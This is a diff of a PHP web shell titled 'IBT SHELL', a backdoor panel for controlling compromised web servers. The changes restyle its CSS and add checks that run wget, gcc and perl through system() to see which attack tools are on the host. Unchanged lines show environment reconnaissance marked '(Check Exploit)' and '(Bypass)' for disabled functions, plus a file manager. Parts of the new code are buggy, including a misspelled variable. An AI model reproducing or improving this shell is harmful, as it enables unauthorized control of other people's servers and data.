@@ -20,12 +20,25 @@ error_reporting(E_ERROR | E_PARSE);
 <head>
 <title>IBT SHELL</title>
 <style>
-body{
+body {
 margin:0;
-background-image:url('ibt.png');
-background-size:cover;
 color:#fff;
 letter-spacing:0.5px;
+/* Location of the image */
+background-image: url(ibt.png);
+/* Background image is centered vertically and horizontally at all times */
+background-position: center center;
+/* Background image doesn't tile */
+background-repeat: no-repeat;
+/* Background image is fixed in the viewport so that it doesn't move when 
+the content's height is greater than the image's height */
+background-attachment: fixed;
+/* This is what makes the background image rescale based
+on the container's size */
+background-size: cover;
+/* Set a background color that will be displayed
+while the background image is loading */
+background-color: #464646;
 }
 p{
 font-size:14px;
@@ -275,7 +288,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								echo ' Curl : <font color="green"> ON</font> / ';
 								}
 								else{
-								echo ' Curl : <font color="red"> OFF</font> / ';
+								echo ' Curl : <font color="yellow"> OFF</font> / ';
 								}
 								//Check Sockets
 								
@@ -284,35 +297,51 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								echo ' Exec : <font color="green"> ON</font> / ';
 								}
 								else{
-								echo ' Exec : <font color="red"> OFF</font> / ';
+								echo ' Exec : <font color="yellow"> OFF</font> / ';
 								}
 								//Check Openbasedir
 								if(!ini_get('open_basedir') != "on"){
-								echo ' Open_basedir : <font color="red"> OFF</font> / ';
+								echo ' Open_basedir : <font color="yellow"> OFF</font> / ';
 								}
 								else{
 								echo ' Open_basedir : <font color="green"> ON</font> / ';
 								}
 								//Check Ini Restore
 								if(!ini_get('ini_restore') != "on"){
-								echo ' Ini_restore : <font color="red"> OFF</font> / ';
+								echo ' Ini restore : <font color="yellow"> OFF</font> / ';
 								}
 								else{
-								echo ' Ini_restore : <font color="green"> ON</font> / ';
+								echo ' Ini restore : <font color="green"> ON</font> / ';
 								}
 								//Check Magic Quotes
 								if(ini_get('magic_quotes_gpc') == '1'){
-									echo 'Magic_quotes_gpc : <font color="red"> ON</font> <a href="?turnoff="><font color="#00ff00"> Turn off </a> ';
+									echo ' Magic_quotes_gpc : <font color="red"> ON</font> / ';
 								}
 								else{
-									echo 'Magic_quotes_gpc : <font color="green"> OFF</font>';
+									echo ' Magic_quotes_gpc : <font color="yellow"> OFF </font> /';
 								}
+								//Check Wget
+								if(system('wget') == '1'){
+									echo ' Wget : <font color="red"> ON</font> / ';
+								}
+								else{
+									echo ' Wget : <font color="yellow"> OFF</font> / ';
+								}
+								//Check Wget
+								if(system('gcc') == '1'){
+									echo ' Gcc : <font color="red"> ON</font> / ';
+								}
+								else{
+									echo ' Gcc : <font color="yellow"> OFF</font> / ';
+								}
+								//Check Perl
+								if(system('perl') == '1'){
+									echo ' Perl : <font color="red"> ON</font> <br />';
+								}
+								else{
+									echo ' Perl : <font color="yellow"> OFF</font> <br /> ';
+								}									
 								?>
-								Sockets: <font color="#008000">ON</font> / 
-								Fetch: <font color="#008000">ON</font> / 
-								Wget: <font color="#008000">ON</font> / 
-								Perl: <font color="#008000">ON</font> / 
-								GCC: <font color="#008000">ON</font><br />
 								<?php
 
 								echo "uname -a : ".php_uname()." (Check Exploit)<br />"; 	
@@ -336,18 +365,22 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								$n=count($path);
 								for($i=0;$i<$n-1;$i++) {
 									$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
-									for($j=0;$j<=$i;$j++)
+									for($j=0;$j<=$i;$j++){
 										$cwd_links .= $path[$j].'/';
 									$cwd_links .= "\")'>".$path[$i]."/</a>";
+									}
 								}
 								
 								?>
 								
-								<?php echo 'Directory : '.$cwd_links.' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a>' ?>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
+								<?php echo 'Directory : '.$cwd.' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a>' ?>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
 								<br>Filesystem Mounted: <?php echo "<span>Free</span> ".viewSize($freeSpace)." of ".viewSize($totalSpace)."  (".(int)($freeSpace/$totalSpace*100)."%)"; ?> 
 								<br>ifconfig : <?=gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?=gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
 								<br />Detected drives: <?=$drives?><br />
-								Disabled Functions : <?=$disable_functions?> (Bypass)<br />
+								Disabled Functions : <?php if($disable_functions ==""){
+								echo "None ";}else{
+								echo $disable_funstions;
+								} ?> (Bypass)<br />
 					</p>
 			</td>
 		</tr>		
